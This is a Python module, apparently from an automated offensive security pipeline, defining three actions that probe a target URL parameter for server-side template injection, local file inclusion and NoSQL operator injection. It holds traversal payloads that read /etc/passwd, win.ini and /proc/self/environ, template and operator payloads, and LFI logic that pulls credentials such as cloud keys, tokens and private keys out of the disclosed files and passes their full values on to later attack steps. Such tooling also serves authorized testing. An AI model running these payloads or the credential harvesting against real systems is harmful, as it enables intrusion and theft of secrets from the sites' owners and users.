"""Server-side injection actions: template evaluation, file inclusion, NoSQL.

These three classes shared the same shape of failure. The modules could detect
them — `web.template_injection`, `web.lfi`, `web.nosql` — but the pipeline had
no registered action able to *prove* one from a URL and a parameter, so a
detection stopped at "the class may be present" and never reached a finding.
The actions here use the same discipline as `web.sqli.detect`: take a clean
baseline, inject one payload, require the injected marker to appear where the
baseline did not have it, require the literal payload to be absent (a
reflection is not evaluation), and re-fetch once before claiming CONFIRMED.

None of these ever writes: every request is a read of the same surface with a
different input.
"""

import json
from urllib.parse import parse_qsl, urlencode, urlparse

from actions.registry import action, ActionContext, ActionResult
from core.validators import extract_secrets, inject_param
from tools.wrappers import curl

# A baseline value that cannot collide with real data. If the page already
# contains one of the markers below without our injection, that marker is not
# evidence and the corresponding payload is skipped.
_BASELINE = "zz_bhs_9f8"

_SSTI_PAYLOADS = (
    ("{{7*7}}", "49"),
    ("{{13*13}}", "169"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("%{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
)

# (payload, markers that can only come from the file server-side). The POSIX
# passwd line is specific enough that a match is not a coincidence; win.ini
# section headers are the equivalent on Windows.
_LFI_PAYLOADS = (
    ("../../../../etc/passwd", ("root:x:0:0:", "root:*:0:0:", "daemon:x:")),
    ("....//....//....//....//etc/passwd", ("root:x:0:0:",)),
    ("/etc/passwd", ("root:x:0:0:",)),
    ("../../../../windows/win.ini", ("[extensions]", "[fonts]")),
    ("..\\..\\..\\..\\windows\\win.ini", ("[extensions]",)),
    ("../../../../proc/self/environ", ("PATH=",)),
)

# Operator payloads. `zzz_no_match_9f8` is the control: a string no document
# can contain, so an empty result set is the correct baseline.
_NO_MATCH = "zzz_no_match_9f8"
_NOSQL_OPERATORS = (
    ("$gt", ""),
    ("$ne", ""),
    ("$regex", ".*"),
)

_NOSQL_ROW_KEYS = ("data", "rows", "results", "items", "docs", "records")

# Types whose full value is worth handing to the next chain leg. A passwd file
# can carry anything; only a structurally valid credential is bound.
_BINDABLE_SECRETS = {
    "aws_access_key", "github_pat", "github_fine_grained", "openai_key",
    "openai_project_key", "slack_token", "stripe_live_key",
    "google_api_key", "private_key", "jwt_token",
}


def _dedupe(url: str, param: str, value: str) -> str:
    """Replace every existing value of `param` (inject_param appends)."""
    if f"{{{param}}}" in url:
        # Path placeholder: substitution is already exact there.
        return inject_param(url, param, value)
    parsed = urlparse(url)
    kept = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
            if k != param]
    kept.append((param, value))
    return parsed._replace(query=urlencode(kept, doseq=True)).geturl()


def _with_query_bracket(url: str, param: str, operator: str,
                        value: str) -> str:
    """Build `param[$op]=value` without collapsing the brackets.

    `urlencode` percent-encodes `[`/`]`, which many parsers still accept, but
    several NoSQL stacks key off the literal bracket form and answer only to
    it. The brackets are written by hand and only the value is encoded.
    """
    if f"{{{param}}}" in url:
        # A path segment is not a dict; bracket syntax only means something
        # to a query-string parser.
        return ""
    parsed = urlparse(url)
    kept = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
            if k != param and not k.startswith(f"{param}[")]
    kept.append((f"{param}[{operator}]", value))
    query = urlencode(kept, doseq=True).replace("%5B", "[").replace("%5D", "]")
    return parsed._replace(query=query).geturl()


def _row_count(body: str):
    """How many records a JSON response carries, or None if it is not JSON."""
    try:
        parsed = json.loads(body)
    except (TypeError, ValueError):
        return None
    if isinstance(parsed, list):
        return len(parsed)
    if isinstance(parsed, dict):
        for key in _NOSQL_ROW_KEYS:
            value = parsed.get(key)
            if isinstance(value, list):
                return len(value)
        if parsed and not any(isinstance(v, (dict, list)) for v in parsed.values()):
            return len(parsed)
    return None


def _status(raw: dict) -> int:
    return int(raw.get("status") or 0)


def _body(raw: dict) -> str:
    return str(raw.get("body") or "")


def _session_headers(ctx: ActionContext) -> dict:
    headers = {"User-Agent": "Mozilla/5.0 (compatible; bhs-probe)"}
    if isinstance(ctx.params.get("headers"), dict):
        headers.update(ctx.params["headers"])
    return headers


@action(
    id="web.ssti.detect",
    risk="LOW",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    description=(
        "Prove server-side template evaluation: inject arithmetic payloads in "
        "several engine syntaxes and require the evaluated result in the "
        "response with the payload text absent."
    ),
    category="web",
)
async def ssti_detect(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    headers = _session_headers(ctx)
    method = str(ctx.params.get("method") or "GET").upper()

    baseline = await curl(_dedupe(url, param, _BASELINE), method=method,
                          headers=headers, output="full")
    if not (200 <= _status(baseline) < 400):
        return ActionResult(
            False, confidence="TENTATIVE",
            error=f"baseline unreachable (HTTP {_status(baseline)})")
    baseline_body = _body(baseline)

    findings = []
    for payload, marker in _SSTI_PAYLOADS:
        if marker in baseline_body:
            # The page already says 49; the marker proves nothing.
            continue
        probe_url = _dedupe(url, param, payload)
        raw = await curl(probe_url, method=method, headers=headers,
                         output="full")
        body = _body(raw)
        if not (200 <= _status(raw) < 300):
            continue
        if marker not in body or payload in body:
            continue
        # Same request again: a template evaluation is deterministic, a
        # reflected fragment or a cached page is not our finding.
        again = await curl(probe_url, method=method, headers=headers,
                           output="full")
        if marker not in _body(again) or payload in _body(again):
            continue
        findings.append({
            "url": probe_url,
            "param": param,
            "payload": payload,
            "marker": marker,
            "status": _status(raw),
            "body_preview": body[:400],
        })
        break

    if not findings:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="no template evaluation reproduced")
    return ActionResult(
        True, confidence="CONFIRMED",
        data={"findings": findings, "count": len(findings)},
        evidence={"action": "web.ssti.detect", "param": param,
                  "payload": findings[0]["payload"]},
    )


@action(
    id="web.lfi.detect",
    risk="LOW",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    description=(
        "Prove local file inclusion: request traversal variants for passwd, "
        "win.ini and /proc/self/environ and require file content the baseline "
        "does not contain. Binds any credential found in the disclosed file."
    ),
    category="web",
)
async def lfi_detect(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    headers = _session_headers(ctx)
    method = str(ctx.params.get("method") or "GET").upper()

    baseline = await curl(_dedupe(url, param, _BASELINE), method=method,
                          headers=headers, output="full")
    if not (200 <= _status(baseline) < 400):
        return ActionResult(
            False, confidence="TENTATIVE",
            error=f"baseline unreachable (HTTP {_status(baseline)})")
    baseline_body = _body(baseline)

    finding = None
    disclosed = ""
    for payload, markers in _LFI_PAYLOADS:
        usable = [m for m in markers if m not in baseline_body]
        if not usable:
            continue
        probe_url = _dedupe(url, param, payload)
        raw = await curl(probe_url, method=method, headers=headers,
                         output="full")
        body = _body(raw)
        if not (200 <= _status(raw) < 300):
            continue
        hit = next((m for m in usable if m in body), "")
        if not hit:
            continue
        again = await curl(probe_url, method=method, headers=headers,
                           output="full")
        if hit not in _body(again):
            continue
        disclosed = body
        finding = {
            "url": probe_url,
            "param": param,
            "payload": payload,
            "marker": hit,
            "status": _status(raw),
            "body_preview": body[:800],
        }
        break

    if finding is None:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="no file disclosure reproduced")

    bindings = {}
    secrets = [s for s in extract_secrets(disclosed)
               if s.get("type") in _BINDABLE_SECRETS
               and s.get("validation", {}).get("verdict") == "structurally_valid"]
    if secrets:
        # Full value only in the in-memory binding channel: the finding (which
        # is persisted) carries the redacted form, and so does its preview.
        bindings["credential"] = secrets[0]["value"]
        preview = finding["body_preview"]
        for secret in secrets:
            preview = preview.replace(secret["value"], secret["redacted"])
        finding["body_preview"] = preview
        finding["secrets"] = [
            {"type": s["type"], "redacted": s["redacted"]} for s in secrets
        ]
    return ActionResult(
        True, confidence="CONFIRMED",
        data={"findings": [finding], "count": 1},
        evidence={"action": "web.lfi.detect", "param": param,
                  "payload": finding["payload"], "marker": finding["marker"]},
        bindings=bindings,
    )


@action(
    id="web.nosql.detect",
    risk="LOW",
    detectability="medium",
    requires=["url", "param"],
    produces="VulnCandidate",
    idempotent=True,
    description=(
        "Prove NoSQL operator injection: a control value returns no records, "
        "an operator-shaped value ($gt/$ne/$regex) returns records, and the "
        "differential reproduces."
    ),
    category="web",
)
async def nosql_detect(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    param = str(ctx.params.get("param") or "").strip()
    if not url or not param:
        return ActionResult(False, error="url and param are required")
    headers = _session_headers(ctx)
    method = str(ctx.params.get("method") or "GET").upper()

    control = await curl(_dedupe(url, param, _NO_MATCH), method=method,
                         headers=headers, output="full")
    if not (200 <= _status(control) < 300):
        return ActionResult(
            False, confidence="TENTATIVE",
            error=f"control request failed (HTTP {_status(control)})")
    control_rows = _row_count(_body(control))
    if control_rows is None:
        return ActionResult(
            False, confidence="TENTATIVE",
            error=("response is not JSON with a record list; operator "
                   "injection cannot be distinguished from a validation error"))
    if control_rows != 0:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="control value matched records; the parameter is not a filter")

    finding = None
    for operator, value in _NOSQL_OPERATORS:
        probe_url = _with_query_bracket(url, param, operator, value)
        if not probe_url:
            return ActionResult(
                False, confidence="TENTATIVE",
                error="operator injection needs a query parameter, not a path "
                      "placeholder")
        raw = await curl(probe_url, method=method, headers=headers,
                         output="full")
        rows = _row_count(_body(raw))
        if not (200 <= _status(raw) < 300) or rows is None or rows <= 0:
            continue
        again = await curl(probe_url, method=method, headers=headers,
                           output="full")
        if _row_count(_body(again)) != rows:
            continue
        finding = {
            "url": probe_url,
            "param": param,
            "operator": operator,
            "control_rows": control_rows,
            "test_rows": rows,
            "status": _status(raw),
            "body_preview": _body(raw)[:400],
        }
        break

    if finding is None:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="no operator-induced record differential reproduced")
    return ActionResult(
        True, confidence="CONFIRMED",
        data={"findings": [finding], "count": 1},
        evidence={"action": "web.nosql.detect", "param": param,
                  "operator": finding["operator"]},
    )
